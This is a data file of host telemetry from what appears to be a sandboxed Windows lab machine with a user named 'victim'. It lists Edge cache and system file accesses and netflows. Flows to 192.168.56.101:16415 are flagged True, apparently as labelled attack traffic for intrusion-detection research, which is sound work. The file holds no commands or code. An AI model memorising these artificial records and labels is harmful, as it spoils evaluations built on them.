4be789e5-988a-46ba-8600-1af6e0bb4aaa,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\f1b076f89f1cca1b_0'},580,False,1,0,1,1,0,1
0b425049-e182-4552-9ab7-a55051b4499d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\b4f84b300748a114_0'},581,False,1,0,1,1,0,1
0b8d6927-71a6-426a-ada2-1b26c2de70ea,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\5c14882e51891d25_0'},582,False,1,0,1,1,0,1
ea468e39-bf51-4d5b-9d5c-0edbda56cf79,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\79f151d882f08df2_0'},583,False,1,0,1,1,0,1
f09125b4-3373-4c55-a349-a7a5367c8208,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\4fce287b5b441d74_0'},584,False,1,0,1,1,0,1
9ab0b584-d81a-4ae5-96f8-74b25da6be0b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\10321e9873897921_0'},585,False,1,0,1,1,0,1
566a5e61-3de8-4993-a578-39f38a1b2737,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\040f11e49243b61d_0'},586,False,1,0,1,1,0,1
faf850a4-3517-4315-b815-e8e55fe51acf,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\a4f8d2c06f10a58b_0'},587,False,1,0,1,1,0,1
8aefc67f-df8b-46b7-b697-8423e1f86689,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\dc4038e735155772_0'},588,False,1,0,1,1,0,1
4d50991c-d3cb-447a-80ba-2e82360df0d3,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\2ccec3ded4220927_0'},589,False,1,0,1,1,0,1
339f379a-c81a-4a23-981a-0d66b332fb9b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Service Worker\\CacheStorage\\3cedfb74d44f2e84198d23075aef16c34a668ceb\\aa6c258a-05d5-4910-ae15-88f927176a51\\37dc59fa0fdce3a3_0'},590,False,1,0,1,1,0,1
f8ae4d69-bb6a-449c-b558-043516c54676,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000a7'},591,False,1,0,1,1,0,1
300c8144-5d0c-45b4-9a86-e4ebb59fd534,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000a2'},592,False,1,0,1,1,0,1
c50d0e19-965e-4679-b930-9611e66a3672,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_000093'},593,False,1,0,1,1,0,1
5237e215-4235-4459-a5a7-f0a2b0a69c69,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000b8'},594,False,1,0,1,1,0,1
51233166-c92b-4203-9c0b-83426fdd9a1a,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_000010'},595,False,1,0,1,1,0,1
3699ef7b-2858-43d1-9db1-2fc8e4fb5d50,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000b9'},596,False,1,0,1,1,0,1
044f119d-4bfa-4fec-9bc2-bc41d6ba287d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_000090'},611,False,1,0,1,1,0,1
3db08c65-c600-403f-873e-8c18cc8f3b21,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000ba'},612,False,1,0,1,1,0,1
d5fcc014-15d7-460c-987c-0fea0a733a0b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000a4'},773,False,1,0,1,1,0,1
4ca6a684-7aeb-4889-a5c8-2d1846e7bcc6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_000082'},780,False,1,0,1,1,0,1
d9a2d1cc-152f-4381-bcc9-d1a0a907217d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000bb'},781,False,1,0,1,1,0,1
0404b4b8-48e9-4b0e-a804-f125c7514d80,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_00009e'},782,False,1,0,1,1,0,1
cc36ee9c-670c-41c5-ada2-b9b446d40439,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_000095'},783,False,1,0,1,1,0,1
ce6ae529-3f34-4942-9934-0b18d0b2a092,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000bc'},784,False,1,0,1,1,0,1
ac087386-cc0d-4498-b21f-460c4ece45e7,{'netflow': '192.168.56.102:57292->192.168.56.101:16415'},807,True,1,0,1,1,0,1
c278791a-0ffd-409c-b23c-9c19c33d1c5d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\GPUCache\\index'},808,False,1,0,1,1,0,1
23bfdf15-bf2d-4995-8025-a3634af00c37,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\GPUCache\\data_0'},809,False,1,0,1,1,0,1
a15cedd5-d72a-48d4-9598-16017502df39,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\GPUCache\\data_1'},810,False,1,0,1,1,0,1
67b0c957-eba4-400f-9959-0b2842b176ef,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\GPUCache\\data_2'},811,False,1,0,1,1,0,1
93802d98-8eca-4877-ac3e-7714d86a3673,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\GPUCache\\data_3'},812,False,1,0,1,1,0,1
4ef032da-0968-41a6-9e49-bb6dd3028fd8,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\DawnWebGPUCache\\index'},813,False,1,0,1,1,0,1
cdf85d4b-f7b5-49e9-bd84-a3cdba663eb0,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\DawnWebGPUCache\\data_0'},814,False,1,0,1,1,0,1
a6e953e2-63bc-4cce-b6e4-81119bd2c6d9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\DawnWebGPUCache\\data_1'},815,False,1,0,1,1,0,1
ec0e65f6-b56e-42d6-a4dc-6c8b765c7bed,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\DawnWebGPUCache\\data_2'},816,False,1,0,1,1,0,1
4853bc49-41d5-41c2-8d51-59830352ef0d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\DawnWebGPUCache\\data_3'},818,False,1,0,1,1,0,1
4c9fe465-d367-4b3f-93c7-f89db8dce430,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\DawnGraphiteCache\\index'},819,False,1,0,1,1,0,1
aa107bc2-016d-45ce-88ba-95bce4156dde,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\DawnGraphiteCache\\data_0'},820,False,1,0,1,1,0,1
ff37528a-0ffb-47f9-8f89-e9364abf3344,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\DawnGraphiteCache\\data_1'},821,False,1,0,1,1,0,1
a3017b11-5154-41e8-ae60-ab6a390cbcdd,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\DawnGraphiteCache\\data_2'},822,False,1,0,1,1,0,1
d222cf13-5979-4be2-bd26-d124db50dc92,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\DawnGraphiteCache\\data_3'},823,False,1,0,1,1,0,1
eb5c9e70-a67d-4db4-874d-1c521d93a081,{'netflow': '192.168.56.102:57548->192.168.56.101:16415'},825,True,1,0,1,1,0,1
399d27d1-00ba-4b6f-ae9a-92663a006c3d,{'netflow': '192.168.56.102:57804->192.168.56.101:16415'},826,True,1,0,1,1,0,1
e54a2fdf-0cc6-4ff3-92b9-d5c288255068,{'netflow': '10.0.2.15:58316->20.96.153.111:47873'},828,False,1,0,1,1,0,1
858d4234-1db5-4ec8-a18d-4112c853f100,{'netflow': '10.0.2.15:58572->4.153.57.10:47873'},829,False,1,0,1,1,0,1
09d891b9-c0ae-49b0-a3ba-191bfa65f775,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\SmartScreen\\local'},830,False,1,0,1,1,0,1
961b0900-f80e-4880-aee1-d30270174be7,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\SmartScreen\\local\\uriCache_'},831,False,1,0,1,1,0,1
14aaae88-4e09-467f-8d86-67bb36434dc3,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\SmartScreen\\local\\uriCache'},832,False,1,0,1,1,0,1
2aa858d8-5306-4464-9661-e0092bd75c7f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\ExtensionActivityEdge-journal'},833,False,1,0,1,1,0,1
534f6562-bebd-4ca0-b83e-b7dd9e66279d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Shortcuts'},835,False,1,0,1,1,0,1
34c92837-4159-4276-ae01-f37ddf8bfc5a,{'file': 'C:\\Program Files (x86)\\desktop.ini'},836,False,1,0,1,1,0,1
f7fc746e-95cf-4884-a1e7-e6b0227bb798,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Workspaces\\Logs\\Workspaces Internals Logs'},837,False,1,0,1,1,0,1
8d88d7e0-4200-4c74-bd48-84b43af33b78,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Crashpad\\settings.dat'},841,False,1,0,1,1,0,1
02df7474-846a-44d3-b293-b412ecd990e5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\favorites_diagnostic.log'},848,False,1,0,1,1,0,1
c2caa37d-2141-4069-8d7b-1e5c3d3aa01b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\EdgeCoupons\\coupons_data.db\\000013.log'},852,False,1,0,1,1,0,1
21d7c267-f4f0-43ad-af11-061b30f361a7,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\EdgeCoupons\\coupons_data.db\\000014.ldb'},856,False,1,0,1,1,0,1
9f350c87-0dd3-4570-a1d6-b356fa4d65d0,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\EdgeCoupons\\coupons_data.db\\000010.log'},857,False,1,0,1,1,0,1
4b7a972b-f0b7-4cc7-9417-afe6f2910ca2,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\rainstart0[1].svg'},861,False,1,0,1,1,0,1
f7485dc6-43cf-4065-b20c-f1c1ec3ee6b6,{'netflow': '192.168.56.102:58828->192.168.56.101:16415'},864,True,1,0,1,1,0,1
5e74fbff-750d-40f6-8b84-d2c51c71f202,{'netflow': '192.168.56.102:59084->192.168.56.101:16415'},865,True,1,0,1,1,0,1
c8949b45-1db3-4e7a-80c0-cb681a65e654,{'netflow': '10.0.2.15:59340->13.89.179.9:47873'},868,False,1,0,1,1,0,1
87572acf-85a5-4863-a64a-1a4f9e7a0c0b,{'netflow': '192.168.56.102:59596->192.168.56.101:16415'},869,True,1,0,1,1,0,1
96df45e8-4238-4070-a847-6b6a0bf68a6d,{'netflow': '192.168.56.102:59852->192.168.56.101:16415'},870,True,1,0,1,1,0,1
ca32aa02-bf29-4de5-a3d7-1503ef3da758,{'file': 'C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations\\ccba5a5986c77e43.automaticDestinations-ms'},875,False,1,0,1,1,0,1
7f9bd02b-e452-4828-aad7-c163b6ecb3c5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\HubApps Icons-journal'},882,False,1,0,1,1,0,1
0f48389e-9d9b-4906-914b-2446db77adfd,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Cache\\Cache_Data\\f_0000bd'},883,False,1,0,1,1,0,1
1149793c-9bb8-4061-bbbf-7fd6a16a3ddc,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\SmartScreen\\local\\downloadCache'},885,False,1,0,1,1,0,1
493cc955-bbe9-4ed4-9d84-d29b6bca060e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\SmartScreen\\local\\downloadCache_'},886,False,1,0,1,1,0,1
8a7abeb8-96b0-49f8-9690-d2b310871274,{'netflow': '10.0.2.15:60108->40.118.171.167:47873'},887,False,1,0,1,1,0,1
1f976908-5bfd-4010-90dd-baa3ecc84c57,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Collections\\collectionsSQLite'},895,False,1,0,1,1,0,1
2d41d3d9-bcc4-4b52-9ba8-3d5c6f666a85,{'file': 'C:\\Users\\victim\\AppData\\Local\\IconCache.db'},901,False,1,0,1,1,0,1
04615005-6b48-4f46-9c77-a7651924850c,{'netflow': '10.0.2.15:60364->13.91.222.61:47873'},902,False,1,0,1,1,0,1
88f64c62-c11e-4370-988e-2e261f1faeb1,{'file': 'd:SmartScree'},903,False,1,0,1,1,0,1
c68c8c9e-8c2f-45fc-8f64-8cbdaf3fa09e,{'file': 'C:\\Windows\\System32\\ieframe.dll'},924,False,1,0,1,1,0,1
ad38fef2-28e7-4337-90dd-41431c2447c1,{'file': 'C:\\Program Files\\Windows Defender\\EppManifest.dll'},926,False,1,0,1,1,0,1
4242f8e4-9fbb-4340-a841-314075f39c68,{'file': 'C:\\Users\\victim\\3D Objects\\desktop.ini'},928,False,1,0,1,1,0,1
051d8daa-89d6-453d-b512-0f236f41bf80,{'file': 'C:\\Users\\victim\\AppData\\Roaming\\Microsoft\\Windows\\Themes\\CachedFiles\\CachedImage_1862_965_POS4.jpg'},937,False,1,0,1,1,0,1
03a67b1d-7bd4-4490-b06a-fd839a286210,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network Action Predictor-journal'},1708,False,1,0,1,1,0,1
e2d87308-31ff-45ca-9e41-d4cbcc18e382,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\Caches\\{3DA71D5A-20CC-432F-A115-DFE92379E91F}.3.ver0x0000000000000015.db'},1711,False,1,0,1,1,0,1
b374c1e7-3a2c-4f88-ae8b-a1cfbd746ac1,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\Caches\\{3DA71D5A-20CC-432F-A115-DFE92379E91F}.3.ver0x0000000000000010.db'},1712,False,1,0,1,1,0,1
75dfaadf-8662-408f-bbb4-4d3e19706b50,{'netflow': '192.168.56.102:63692->192.168.56.101:53764'},1780,True,1,0,1,1,0,1
41a8f9f8-1442-499e-a37a-1ef92b09df14,{'netflow': '10.0.2.15:46284->2.21.9.40:47873'},1791,False,1,0,1,1,0,1
bb4d1e58-e44b-4ff2-a586-850b65e0b3d9,{'netflow': '10.0.2.15:63948->2.21.9.40:47873'},1792,False,1,0,1,1,0,1
15c3c7e5-4e71-4e59-a780-c7d1d058b40d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\eventbrief[1].svg'},1793,False,1,0,1,1,0,1
067b3595-ba97-4a28-b092-4c754a010b56,{'netflow': '10.0.2.15:52940->20.50.73.10:47873'},1794,False,1,0,1,1,0,1
d462c358-78e4-40b2-8bfc-a3fe2f2391b4,{'netflow': '10.0.2.15:53452->204.79.197.203:47873'},1799,False,1,0,1,1,0,1
80a1c52f-851c-435d-99ae-67e17da95797,{'netflow': '10.0.2.15:53964->20.50.73.10:47873'},1801,False,1,0,1,1,0,1
02ef15e7-9418-44bc-b144-ba9116a6f478,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Shared Dictionary\\cache\\8013211cbe57f278_0'},1832,False,1,0,1,1,0,1
1004ebcb-28bc-4cd2-b902-a99ff2569cfe,{'netflow': '10.0.2.15:64460->20.42.65.84:47873'},1833,False,1,0,1,1,0,1
a0f4deeb-b266-47e9-a0e8-be7105be62f7,{'netflow': '192.168.56.102:64716->192.168.56.101:16415'},1834,True,1,0,1,1,0,1
9ed406b4-d9a4-4d6d-920f-96638b334ec7,{'netflow': '192.168.56.102:64972->192.168.56.101:16415'},1835,True,1,0,1,1,0,1
8c6c96a8-3cba-4066-a154-e43e5e9a20a8,{'netflow': '192.168.56.102:65228->192.168.56.101:16415'},1836,True,1,0,1,1,0,1
5e5d4e19-e000-4f43-894c-1d80213e7f82,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Shortcuts-journal'},1837,False,1,0,1,1,0,1
d390e1c3-ab5d-41a1-8544-1f87b1301d72,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\TB_W06_Cloudy_01[1].svg'},1838,False,1,0,1,1,0,1
c715aecf-fc81-4a3f-83cb-7b46c21507b9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\TB_W06_Cloudy_18[1].svg'},1839,False,1,0,1,1,0,1
7f072df8-8ed0-4981-b4b0-2255a5187899,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\TB_W06_Cloudy_03[1].svg'},1840,False,1,0,1,1,0,1
d7eaf97a-d950-46e5-86aa-189ff03a7882,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\TB_W06_Cloudy_05[1].svg'},1841,False,1,0,1,1,0,1
038657f5-0683-4f02-96f9-421afe4e37b0,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\TB_W06_Cloudy_04[1].svg'},1842,False,1,0,1,1,0,1
8554c114-7246-49d7-91e9-92f5323236ef,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\TB_W06_Cloudy_23[1].svg'},1843,False,1,0,1,1,0,1
90690447-7dcd-44bd-8d13-27c91406878e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\TB_W06_Cloudy_08[1].svg'},1844,False,1,0,1,1,0,1
499fbc26-e6d6-405e-9219-adf6905ef898,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\TB_W06_Cloudy_07[1].svg'},1845,False,1,0,1,1,0,1
3fc4f357-3181-4d18-9615-4d4a1b449e7c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\TB_W06_Cloudy_09[1].svg'},1846,False,1,0,1,1,0,1
010d7a2b-95c0-40be-9ded-0bab2d113f97,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\TB_W06_Cloudy_10[1].svg'},1847,False,1,0,1,1,0,1
2036e4d2-e779-4e16-850d-176dc23406c6,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\TB_W06_Cloudy_13[1].svg'},1848,False,1,0,1,1,0,1
ca29cd3e-a615-42f0-8ec0-82154ae08013,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\TB_W06_Cloudy_12[1].svg'},1849,False,1,0,1,1,0,1
3c9e0c0b-6a74-4a1a-8b0b-b380c534227b,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\TB_W06_Cloudy_11[1].svg'},1850,False,1,0,1,1,0,1
9bcb5b77-6e15-4b00-a1f7-4eccffcb3299,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\TB_W06_Cloudy_14[1].svg'},1851,False,1,0,1,1,0,1
2cf25f8a-0bcf-49b5-a60a-85b39d845b16,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\TB_W06_Cloudy_02[1].svg'},1852,False,1,0,1,1,0,1
557d6b71-ab19-4427-9345-a5793758602c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\TB_W06_Cloudy_15[1].svg'},1853,False,1,0,1,1,0,1
9365de32-f94f-49a1-9b09-8afa4ed0a76c,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\TB_W06_Cloudy_17[1].svg'},1854,False,1,0,1,1,0,1
c36013b9-7cfd-4bc4-9b70-68a999d155c7,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\TB_W06_Cloudy_16[1].svg'},1855,False,1,0,1,1,0,1
272c6937-d6aa-4d79-be92-c1e29284abcd,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\TB_W06_Cloudy_19[1].svg'},1856,False,1,0,1,1,0,1
e12eaac8-c76a-49a8-a30d-adc2d23aa4dd,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\TB_W06_Cloudy_20[1].svg'},1857,False,1,0,1,1,0,1
242a926f-653a-4e0b-ad4f-c67df5e4cf45,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\TB_W06_Cloudy_21[1].svg'},1858,False,1,0,1,1,0,1
246cd250-8292-4e7e-9a98-a5ff5c638779,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\TB_W06_Cloudy_22[1].svg'},1859,False,1,0,1,1,0,1
141bdfe3-148d-4f6d-8f6e-a7062dfdb6da,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\TB_W06_Cloudy_06[1].svg'},1860,False,1,0,1,1,0,1
76d18c2e-4788-45df-80b2-0cda1f19dc35,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\TB_W06_Cloudy_24[1].svg'},1861,False,1,0,1,1,0,1
404f0149-135b-40a6-b53d-fcb7f61cb6e4,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\TB_W06_Cloudy_28[1].svg'},1862,False,1,0,1,1,0,1
d98c23c8-2424-4d4f-993b-5ba868b8f4af,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\TB_W06_Cloudy_25[1].svg'},1863,False,1,0,1,1,0,1
5b2307ab-eb32-4e2c-83fe-488bca8a0d1d,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\TB_W06_Cloudy_26[1].svg'},1864,False,1,0,1,1,0,1
aed1b6af-8ddb-4b7f-87df-ee77ba316aa3,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\TB_W06_Cloudy_27[1].svg'},1865,False,1,0,1,1,0,1
0e78f950-2280-46c1-a5e2-f1952bac4c43,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\TB_W06_Cloudy_29[1].svg'},1866,False,1,0,1,1,0,1
941fbd6a-7915-455d-b82f-348259d1bd0f,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\TB_W06_Cloudy_30[1].svg'},1867,False,1,0,1,1,0,1
528c8e1f-4fb1-4b15-b959-8c9097453d99,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\WI10_TempsBreakRecordHigh_08[1].svg'},1868,False,1,0,1,1,0,1
a33add7c-aa9b-4d33-9b93-49a9083f5a61,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\TB_W06_Cloudy_31[1].svg'},1869,False,1,0,1,1,0,1
27317e18-eaf9-4e7d-a94b-359faf34dc02,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\DLVWNFMQ\\TB_W06_Cloudy_32[1].svg'},1870,False,1,0,1,1,0,1
08878afe-3ccd-4ecd-8cf8-aef49227da46,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\TB_W06_Cloudy_33[1].svg'},1871,False,1,0,1,1,0,1
8bcb8ead-a947-4a6b-ab83-8c0025ac5920,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\TB_W06_Cloudy_34[1].svg'},1872,False,1,0,1,1,0,1
83cebf40-e70f-47d9-a4b2-3022ca6203f5,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\TB_W06_Cloudy_35[1].svg'},1873,False,1,0,1,1,0,1
ef47ec46-0f8a-4bd5-8c31-fd23273308cc,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\WI10_TempsBreakRecordHigh_15[1].svg'},1874,False,1,0,1,1,0,1
6d02d0c3-36e1-4bcd-8f9d-ab48c2d60c33,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\6DNTYFPY\\TB_W06_Cloudy_37[1].svg'},1875,False,1,0,1,1,0,1
f13e4f5b-cdd3-4fdb-9a39-2056b10d894e,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\69CDNZW2\\TB_W06_Cloudy_38[1].svg'},1876,False,1,0,1,1,0,1
d5a0675d-767d-4f2a-a4e3-0080ae5fd8e9,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\TB_W06_Cloudy_39[1].svg'},1877,False,1,0,1,1,0,1
2744a59d-4e8f-4286-9724-8f03e69ad4a0,{'file': 'C:\\Users\\victim\\AppData\\Local\\Microsoft\\Windows\\INetCache\\IE\\CY46PLUZ\\TB_W06_Cloudy_40[1].svg'},1878,False,1,0,1,1,0,1
